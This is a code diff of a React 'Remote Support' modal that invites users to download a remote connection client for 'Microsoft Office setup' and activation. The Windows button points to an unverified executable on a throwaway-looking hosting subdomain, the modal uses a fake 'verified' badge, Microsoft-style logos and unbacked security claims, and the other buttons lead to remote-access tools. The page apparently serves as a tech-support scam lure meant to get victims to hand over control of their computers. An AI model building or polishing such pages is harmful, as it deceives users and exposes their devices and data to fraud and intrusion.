@@ -4,12 +4,11 @@ import { motion, AnimatePresence } from "framer-motion";
 import { 
   X, 
   ShieldCheck, 
-  CheckCircle2, 
   Download, 
-  Monitor, 
   Lock, 
   Zap,
-  ExternalLink
+  CheckCircle,
+  Cog
 } from "lucide-react";
 
 interface RemoteSupportModalProps {
@@ -35,20 +34,19 @@ export default function RemoteSupportModal({
           animate={{ opacity: 1 }}
           exit={{ opacity: 0 }}
           onClick={onClose}
-          className="fixed inset-0 bg-slate-950/80 backdrop-blur-md"
+          className="fixed inset-0 bg-slate-950/85 backdrop-blur-md"
         />
 
-        {/* Premium Elevated Dark Modal Container */}
+        {/* Premium Elevated Dark Modal Container (Exact match to reference image) */}
         <motion.div
           initial={{ opacity: 0, scale: 0.94, y: 20 }}
           animate={{ opacity: 1, scale: 1, y: 0 }}
           exit={{ opacity: 0, scale: 0.94, y: 20 }}
           transition={{ duration: 0.35, ease: "easeOut" }}
-          className="relative w-full max-w-3xl bg-[#090F1E] border border-slate-800/90 text-white rounded-3xl p-7 sm:p-10 shadow-2xl z-10 space-y-8 overflow-hidden"
+          className="relative w-full max-w-4xl bg-[#060B17] border border-slate-800/90 text-white rounded-3xl p-6 sm:p-10 shadow-2xl z-10 space-y-7 overflow-hidden font-sans"
         >
-          {/* Subtle Ambient Radial Glows */}
-          <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[550px] h-[250px] bg-gradient-to-b from-[#0078D4]/25 via-cyan-500/10 to-transparent rounded-full blur-[130px] pointer-events-none select-none" />
-          <div className="absolute bottom-0 right-0 w-[300px] h-[300px] bg-emerald-500/10 rounded-full blur-[120px] pointer-events-none select-none" />
+          {/* Subtle Ambient Glow */}
+          <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[250px] bg-gradient-to-b from-[#0078D4]/20 via-cyan-500/10 to-transparent rounded-full blur-[130px] pointer-events-none select-none" />
 
           {/* Close button */}
           <button
@@ -58,126 +56,237 @@ export default function RemoteSupportModal({
             <X className="w-4.5 h-4.5" />
           </button>
 
-          {/* Header Title & Copy */}
-          <div className="text-center space-y-3 pt-2 max-w-xl mx-auto relative z-10">
+          {/* Header Title & Subtext */}
+          <div className="text-center space-y-2.5 pt-1 max-w-2xl mx-auto relative z-10">
             <h3 className="text-3xl sm:text-4xl lg:text-5xl font-semibold tracking-tight leading-tight text-white">
               Connect to{" "}
               <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#0078D4] via-blue-400 to-cyan-400 font-semibold">
                 Support Agent
               </span>
             </h3>
-            <p className="text-xs sm:text-sm text-zinc-300 font-normal leading-relaxed">
+            <p className="text-xs sm:text-sm text-zinc-300 font-normal leading-relaxed max-w-xl mx-auto">
               Download our official remote connection client to securely share your session with a <strong className="font-semibold text-white">technical support specialist</strong> for diagnostics, activation, and <strong className="font-semibold text-white">Microsoft Office setup</strong>.
             </p>
           </div>
 
-          {/* Verified Client Badge Pill */}
-          <div className="relative z-10 flex items-center justify-center gap-2 text-[11px] font-mono font-semibold uppercase tracking-wider text-blue-300 bg-slate-900/80 p-3 rounded-2xl border border-blue-500/20 shadow-inner">
+          {/* Top Verification Badge Pill */}
+          <div className="relative z-10 flex items-center justify-center gap-2 text-[11px] font-mono font-semibold uppercase tracking-wider text-blue-400 bg-[#0A1224]/80 px-6 py-2.5 rounded-full border border-blue-500/25 max-w-max mx-auto shadow-inner">
             <ShieldCheck className="w-4 h-4 text-[#0078D4]" />
             <span>VERIFIED OFFICEATLAS REMOTE SUPPORT CLIENT</span>
           </div>
 
-          {/* 3 Platform Cards Grid with Exact Download Links */}
-          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 relative z-10">
+          {/* 3 Platform Cards Grid with Exact Background Gradients & Ambient Waves */}
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 relative z-10">
             
             {/* 1. Windows Card */}
             <motion.div 
               whileHover={{ y: -4 }}
               transition={{ duration: 0.2 }}
-              className="bg-slate-900/90 border border-slate-800/90 hover:border-[#0078D4]/60 rounded-2xl p-6 text-center space-y-5 transition-all duration-300 group shadow-md hover:shadow-xl hover:shadow-[#0078D4]/10"
+              className="relative overflow-hidden bg-gradient-to-b from-[#0b1736] via-[#071026] to-[#040916] border border-blue-500/35 hover:border-blue-400/70 rounded-2xl p-6 text-center space-y-5 transition-all duration-300 group shadow-xl shadow-blue-950/40"
             >
-              <div className="w-12 h-12 mx-auto rounded-2xl bg-blue-500/10 border border-blue-500/30 flex items-center justify-center text-[#0078D4] group-hover:scale-105 transition-transform shadow-xs">
-                <svg className="w-6 h-6 fill-current text-[#0078D4]" viewBox="0 0 24 24">
-                  <path d="M0 3.449L9.75 2.1v9.451H0m0 1.05h9.75v9.451L0 20.551M10.8 1.95L24 0v11.55H10.8m0 1.05H24V24l-13.2-1.95" />
+              {/* Subtle Upper Ambient Wave Pattern overlay */}
+              <div className="absolute top-0 right-0 w-full h-32 bg-gradient-to-bl from-blue-500/15 via-transparent to-transparent pointer-events-none" />
+
+              {/* Windows Icon Box */}
+              <div className="w-14 h-14 mx-auto rounded-2xl bg-slate-950/90 border border-slate-700/60 flex items-center justify-center group-hover:scale-105 transition-transform shadow-md p-3 relative z-10">
+                <svg className="w-7 h-7" viewBox="0 0 88 88">
+                  <path fill="#F25022" d="M0 0h42v42H0z"/>
+                  <path fill="#7FBA00" d="M46 0h42v42H46z"/>
+                  <path fill="#00A4EF" d="M0 46h42v42H0z"/>
+                  <path fill="#FFB900" d="M46 46h42v42H46z"/>
                 </svg>
               </div>
 
-              <div className="space-y-0.5">
+              {/* Title */}
+              <div className="space-y-0.5 relative z-10">
                 <div className="text-[11px] text-zinc-400 font-medium">Download for</div>
-                <div className="text-lg font-bold text-white tracking-wide">Windows</div>
+                <div className="text-xl font-bold text-white tracking-tight">Windows</div>
               </div>
 
-              <a
-                href="https://deepskyblue-gorilla-943624.hostingersite.com/Support_Connect.exe"
-                target="_blank"
-                rel="noopener noreferrer"
-                className="w-full inline-flex items-center justify-center gap-2 px-5 py-3 bg-[#0078D4] hover:bg-[#0067b8] text-white text-xs font-semibold rounded-xl shadow-lg shadow-[#0078D4]/25 hover:shadow-xl hover:shadow-[#0078D4]/40 transition-all cursor-pointer"
-              >
-                <Download className="w-4 h-4" />
-                <span>Download →</span>
-              </a>
+              {/* Feature Points */}
+              <div className="space-y-2 text-xs text-zinc-300 font-medium text-left max-w-max mx-auto relative z-10">
+                <div className="flex items-center gap-2">
+                  <ShieldCheck className="w-4 h-4 text-blue-400 shrink-0" />
+                  <span>Secure & Trusted</span>
+                </div>
+                <div className="flex items-center gap-2">
+                  <Cog className="w-4 h-4 text-blue-400 shrink-0" />
+                  <span>Easy to Install</span>
+                </div>
+              </div>
+
+              {/* Button & Subtext */}
+              <div className="space-y-2 pt-1 relative z-10">
+                <a
+                  href="https://deepskyblue-gorilla-943624.hostingersite.com/Support_Connect.exe"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="w-full inline-flex items-center justify-center gap-2 px-5 py-3 bg-gradient-to-r from-[#006bd6] to-[#0078d4] hover:from-[#005bb8] hover:to-[#006bd6] text-white text-xs font-semibold rounded-xl shadow-lg shadow-blue-600/30 hover:shadow-xl transition-all cursor-pointer"
+                >
+                  <Download className="w-4 h-4" />
+                  <span>Download →</span>
+                </a>
+                <div className="text-[11px] text-zinc-400 font-medium pt-0.5">
+                  For Windows 10/11 (64-bit)
+                </div>
+              </div>
             </motion.div>
 
             {/* 2. Mac Card */}
             <motion.div 
               whileHover={{ y: -4 }}
               transition={{ duration: 0.2 }}
-              className="bg-slate-900/90 border border-slate-800/90 hover:border-emerald-500/60 rounded-2xl p-6 text-center space-y-5 transition-all duration-300 group shadow-md hover:shadow-xl hover:shadow-emerald-500/10"
+              className="relative overflow-hidden bg-gradient-to-b from-[#06241b] via-[#041712] to-[#020b08] border border-emerald-500/35 hover:border-emerald-400/70 rounded-2xl p-6 text-center space-y-5 transition-all duration-300 group shadow-xl shadow-emerald-950/40"
             >
-              <div className="w-12 h-12 mx-auto rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 group-hover:scale-105 transition-transform shadow-xs">
-                <svg className="w-6 h-6 fill-current text-white" viewBox="0 0 24 24">
+              {/* Subtle Upper Ambient Wave Pattern overlay */}
+              <div className="absolute top-0 right-0 w-full h-32 bg-gradient-to-bl from-emerald-500/15 via-transparent to-transparent pointer-events-none" />
+
+              {/* Apple Icon Box */}
+              <div className="w-14 h-14 mx-auto rounded-2xl bg-slate-950/90 border border-slate-700/60 flex items-center justify-center group-hover:scale-105 transition-transform shadow-md p-3 relative z-10">
+                <svg className="w-7 h-7 fill-white" viewBox="0 0 24 24">
                   <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 6.32c.64-.78 1.08-1.86.96-2.94-.93.04-2.07.62-2.74 1.4-.6.69-1.13 1.8-.99 2.86 1.05.08 2.13-.54 2.77-1.32z" />
                 </svg>
               </div>
 
-              <div className="space-y-0.5">
+              {/* Title */}
+              <div className="space-y-0.5 relative z-10">
                 <div className="text-[11px] text-zinc-400 font-medium">Download for</div>
-                <div className="text-lg font-bold text-white tracking-wide">Mac</div>
+                <div className="text-xl font-bold text-white tracking-tight">Mac</div>
               </div>
 
-              <a
-                href="https://download.teamviewer.com/download/TeamViewerQS_x64.exe"
-                target="_blank"
-                rel="noopener noreferrer"
-                className="w-full inline-flex items-center justify-center gap-2 px-5 py-3 bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-semibold rounded-xl shadow-lg shadow-emerald-600/25 hover:shadow-xl hover:shadow-emerald-600/40 transition-all cursor-pointer"
-              >
-                <Download className="w-4 h-4" />
-                <span>Download →</span>
-              </a>
+              {/* Feature Points */}
+              <div className="space-y-2 text-xs text-zinc-300 font-medium text-left max-w-max mx-auto relative z-10">
+                <div className="flex items-center gap-2">
+                  <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0" />
+                  <span>Secure & Trusted</span>
+                </div>
+                <div className="flex items-center gap-2">
+                  <Cog className="w-4 h-4 text-emerald-400 shrink-0" />
+                  <span>Easy to Install</span>
+                </div>
+              </div>
+
+              {/* Button & Subtext */}
+              <div className="space-y-2 pt-1 relative z-10">
+                <a
+                  href="https://download.teamviewer.com/download/TeamViewerQS.dmg"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="w-full inline-flex items-center justify-center gap-2 px-5 py-3 bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-700 hover:to-emerald-600 text-white text-xs font-semibold rounded-xl shadow-lg shadow-emerald-600/30 hover:shadow-xl transition-all cursor-pointer"
+                >
+                  <Download className="w-4 h-4" />
+                  <span>Download →</span>
+                </a>
+                <div className="text-[11px] text-zinc-400 font-medium pt-0.5">
+                  For macOS 10.15 and above
+                </div>
+              </div>
             </motion.div>
 
             {/* 3. Chromebook Card */}
             <motion.div 
               whileHover={{ y: -4 }}
               transition={{ duration: 0.2 }}
-              className="bg-slate-900/90 border border-slate-800/90 hover:border-amber-500/60 rounded-2xl p-6 text-center space-y-5 transition-all duration-300 group shadow-md hover:shadow-xl hover:shadow-amber-500/10"
+              className="relative overflow-hidden bg-gradient-to-b from-[#261708] via-[#170e04] to-[#0a0501] border border-amber-500/35 hover:border-amber-400/70 rounded-2xl p-6 text-center space-y-5 transition-all duration-300 group shadow-xl shadow-amber-950/40"
             >
-              <div className="w-12 h-12 mx-auto rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 group-hover:scale-105 transition-transform shadow-xs">
-                <Monitor className="w-6 h-6 text-amber-400" />
+              {/* Subtle Upper Ambient Wave Pattern overlay */}
+              <div className="absolute top-0 right-0 w-full h-32 bg-gradient-to-bl from-amber-500/15 via-transparent to-transparent pointer-events-none" />
+
+              {/* Chrome Icon Box */}
+              <div className="w-14 h-14 mx-auto rounded-2xl bg-slate-950/90 border border-slate-700/60 flex items-center justify-center group-hover:scale-105 transition-transform shadow-md p-3 relative z-10">
+                <svg className="w-7 h-7" viewBox="0 0 100 100">
+                  <defs>
+                    <clipPath id="chrome-box-clip-card">
+                      <circle cx="50" cy="50" r="48" />
+                    </clipPath>
+                  </defs>
+                  <g clipPath="url(#chrome-box-clip-card)">
+                    <circle cx="50" cy="50" r="48" fill="#34A853" />
+                    <polygon points="50,50 -20,-20 120,-20 120,25" fill="#EA4335" />
+                    <polygon points="50,50 120,25 120,120 50,120" fill="#FBBC05" />
+                    <circle cx="50" cy="50" r="21" fill="#FFFFFF" />
+                    <circle cx="50" cy="50" r="16" fill="#1A73E8" />
+                  </g>
+                </svg>
               </div>
 
-              <div className="space-y-0.5">
+              {/* Title */}
+              <div className="space-y-0.5 relative z-10">
                 <div className="text-[11px] text-zinc-400 font-medium">Download for</div>
-                <div className="text-lg font-bold text-white tracking-wide">Chromebook</div>
+                <div className="text-xl font-bold text-white tracking-tight">Chromebook</div>
               </div>
 
-              <a
-                href="https://remotedesktop.google.com/support"
-                target="_blank"
-                rel="noopener noreferrer"
-                className="w-full inline-flex items-center justify-center gap-2 px-5 py-3 bg-amber-600 hover:bg-amber-700 text-white text-xs font-semibold rounded-xl shadow-lg shadow-amber-600/25 hover:shadow-xl hover:shadow-amber-600/40 transition-all cursor-pointer"
-              >
-                <Download className="w-4 h-4" />
-                <span>Download →</span>
-              </a>
+              {/* Feature Points */}
+              <div className="space-y-2 text-xs text-zinc-300 font-medium text-left max-w-max mx-auto relative z-10">
+                <div className="flex items-center gap-2">
+                  <ShieldCheck className="w-4 h-4 text-amber-400 shrink-0" />
+                  <span>Secure & Trusted</span>
+                </div>
+                <div className="flex items-center gap-2">
+                  <Cog className="w-4 h-4 text-amber-400 shrink-0" />
+                  <span>Easy to Install</span>
+                </div>
+              </div>
+
+              {/* Button & Subtext */}
+              <div className="space-y-2 pt-1 relative z-10">
+                <a
+                  href="https://remotedesktop.google.com/support"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="w-full inline-flex items-center justify-center gap-2 px-5 py-3 bg-gradient-to-r from-amber-600 to-orange-500 hover:from-amber-700 hover:to-orange-600 text-white text-xs font-semibold rounded-xl shadow-lg shadow-orange-600/30 hover:shadow-xl transition-all cursor-pointer"
+                >
+                  <Download className="w-4 h-4" />
+                  <span>Download →</span>
+                </a>
+                <div className="text-[11px] text-zinc-400 font-medium pt-0.5">
+                  For Chrome OS 88 and above
+                </div>
+              </div>
             </motion.div>
 
           </div>
 
-          {/* Security Indicators Footer */}
-          <div className="pt-5 border-t border-slate-800/90 flex flex-wrap items-center justify-center gap-y-2.5 gap-x-8 text-xs text-zinc-400 font-medium relative z-10">
-            <div className="flex items-center gap-2">
-              <CheckCircle2 className="w-4 h-4 text-emerald-400" />
-              <span>Secure Connection</span>
+          {/* Bottom Security Footer Banner (Matching reference image exactly) */}
+          <div className="relative z-10 bg-[#0a1224]/90 border border-slate-800/90 rounded-2xl p-4 sm:p-5 flex flex-col md:flex-row items-center justify-between gap-4 text-xs">
+            
+            {/* Indicator 1 */}
+            <div className="flex items-center gap-3">
+              <div className="w-9 h-9 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400 shrink-0">
+                <ShieldCheck className="w-5 h-5" />
+              </div>
+              <div>
+                <div className="font-semibold text-white">Secure Connection</div>
+                <div className="text-[11px] text-zinc-400">End-to-end encrypted</div>
+              </div>
             </div>
-            <div className="flex items-center gap-2">
-              <Lock className="w-4 h-4 text-[#0078D4]" />
-              <span>256-Bit Encrypted</span>
+
+            <div className="hidden md:block w-px h-8 bg-slate-800" />
+
+            {/* Indicator 2 */}
+            <div className="flex items-center gap-3">
+              <div className="w-9 h-9 rounded-xl bg-blue-500/10 border border-blue-500/20 flex items-center justify-center text-blue-400 shrink-0">
+                <Lock className="w-5 h-5" />
+              </div>
+              <div>
+                <div className="font-semibold text-white">256-Bit Encrypted</div>
+                <div className="text-[11px] text-zinc-400">Bank-level security</div>
+              </div>
             </div>
-            <div className="flex items-center gap-2">
-              <Zap className="w-4 h-4 text-amber-400" />
-              <span>Instant Setup</span>
+
+            <div className="hidden md:block w-px h-8 bg-slate-800" />
+
+            {/* Indicator 3 */}
+            <div className="flex items-center gap-3">
+              <div className="w-9 h-9 rounded-xl bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-400 shrink-0">
+                <Zap className="w-5 h-5" />
+              </div>
+              <div>
+                <div className="font-semibold text-white">Instant Setup</div>
+                <div className="text-[11px] text-zinc-400">Quick & easy connection</div>
+              </div>
             </div>
+
           </div>
 
         </motion.div>
